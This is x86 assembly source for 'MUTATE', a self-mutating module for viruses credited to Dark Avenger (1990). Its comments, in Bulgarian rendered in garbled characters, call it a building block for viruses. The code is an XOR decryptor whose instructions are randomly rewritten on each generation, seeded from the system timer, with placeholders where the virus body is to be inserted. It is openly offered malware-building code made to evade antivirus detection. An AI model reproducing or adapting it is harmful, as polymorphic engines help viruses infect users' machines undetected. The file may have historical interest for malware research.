	page	,132
	name	mutate
	title	MUTATE - A Self-mutating Module for Viruses
	.radix	16
	.model	tiny
	.code

; This source code is a copyrighted material
; (C) 1990 DARK AVENGER

	org	100

timer	equ	46C

start:
	jmp	prog

; Декоди░а о▒новна▓а ╖а▒▓ и оп░едел┐ номе░а на гене░а╢и┐▓а и ад░е▒а на v_entry.
; За да нап░ави по▒ледно▓о, взиме опе░анда на JMP-a, кой▓о ▓░┐бва да ▒▓ои на
; ад░е▒ 100, ▓.е. нап░авено е ▒амо за .COM ┤айлове.

v_entry:
	xchg	ax,bp
	mov	si,100
	inc	si
	add	si,[si]
	mov	di,si
	xor	dx,dx
	mov	cx,(top-encrypt)/2-1
	push	cx
calcgen:
	xor	dx,[si+encrypt-v_entry+2]
	org	$-1
	inc	si
	inc	si
	dec	cx
	jns	calcgen
	pop	ax
decrypt:
	xor	[di+encrypt-v_entry+2],dx
	org	$-1
	inc	di
	inc	di
	dec	ax
	jns	decrypt
encrypt:
	xchg	si,si		;Тези ин▒▓░│к╢ии ▒а необ╡одими
	xchg	dx,dx
	add	si,encrypt-top+2
	dec	dx

; Т│к ▓░┐бва да ▒е ▒ложи ини╢иализи░а╣а▓а ╖а▒▓ на ви░│▒а. Па░аме▓░и:
;   DX = -номе░ на гене░а╢и┐▓а
;   SI = ад░е▒ на е▓ике▓а v_entry.

; . . .
prog:
	push	ds
	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[timer]
	pop	ds
	call	mutate
	mov	ax,4C00
	int	21

; Тази подп░ог░ама ▒║здава ▒л│╖айна м│▓а╢и┐ на декоди░а╣а▓а ╖а▒▓. Па░аме▓░и:
;   AX = ▒л│╖айно ╖и▒ло (взе▓о о▓ 0:46C)

mutate:
	cld
	xor	dx,dx
	push	cs
	pop	ds
	mov	cx,90
	div	cx
	call	getcode
	mov	ds:[15],al
	call	getcode
	mov	ds:[1E],al
	xchg	ax,dx
	mov	dl,6
	div	dl
	mov	si,offset muttbl
	mov	bx,offset xlatbl1
	call	buildblk
	mov	[si],al
	inc	si
	mov	bx,offset xlatbl2
	call	buildblk2
	mov	bx,offset xlatbl3
	call	buildblk2
	mov	bx,offset muttbl-1
	mov	si,offset xlatdat
	mov	cx,xlatbl1-xlatdat
nextgen:
	lodsb
	test	al,al
	jz	cantchg
	push	ax
	and	al,111b
	xlat
	mov	ah,0F8
	xchg	ax,dx
	pop	ax
	push	cx
	mov	cl,3
	shr	al,cl
	jz	skipxlat
	xlat
	shl	al,cl
	jz	skipxlat
	xlat
	shl	al,cl
	or	dl,al
	mov	dh,0c0
skipxlat:
	pop	cx
	and	[si-(xlatdat+1-v_entry)],dh
	or	[si-(xlatdat+1-v_entry)],dl
cantchg:
	loop	nextgen
	ret

buildblk2:
	mov	al,ah
buildblk:
	shr	al,1
	mov	dl,al
	push	ax
	adc	al,1
	cmp	al,3
	jb	setblk
	sub	al,3
setblk:
	or	dl,al
	xlat
	mov	[si],al
	inc	si
	pop	ax
	xlat
	mov	[si],al
	inc	si
	mov	al,dl
	xor	al,3
	xlat
	ret

getcode:
	shr	dx,1
	mov	al,79
	jnc	got
	or	al,100b
got:
	ret

xlatdat db	0,4,0,0,4,0,26,0
	db	2c,0,9,2,0,0,2,0
	db	0e,0,4,4,2,0,0,3
	db	0,0f,0,5,5,3,0,0
	db	0,4,0,1

xlatbl1 db	0,1,2
xlatbl2 db	3,6,7
xlatbl3 db	7,4,5

chksum	dw	1A03		;Кон▓░олна ▒│ма на ви░│▒а.
; ВНИМАНИЕ! Тази кон▓░олна ▒│ма ▓░┐бва да ▒е ▒ме▓не на ░║ка. Т┐ ▒е ▒м┐▓а ка▓о
; ▒е еXOR-на▓ в▒и╖ки 16-би▓ови д│ми межд│ encrypt и top. Б░о┐ им ▓░┐бва да б║де
; не╖е▓но ╖и▒ло, а о▒вен ▓ова ▒ами┐ е▓ике▓ chksum ▓░┐бва да б║де на г░ани╢а на
; д│ма. Ди░ек▓иви▓е errnz в к░а┐ на ┤айла о▒иг│░┐ва▓ ▓ова. О▒вен ▓ова ако межд│
; encrypt и top има н┐какви данни или код кои▓о ▒е п░омен┐▓, ▓┐ ▓░┐бва да ▒е
; ▒м┐▓а по опи▒ани┐ алго░и▓║м п░и в▒┐ко за░аз┐ване на ┤айл.

; Т│к ▓░┐бва да ▒е ▒ложи о▒▓анала▓а ╖а▒▓ о▓ ви░│▒а

; . . .

top:
	.errnz	(encrypt-v_entry) mod 2
	.errnz	(top-encrypt) mod 4-2
	.errnz	(top-v_entry) mod 2
	.errnz	(chksum-v_entry) mod 2

muttbl	db	7 dup(?)	;Рабо▓на обла▒▓ за подп░ог░ама▓а mutate

	end	start
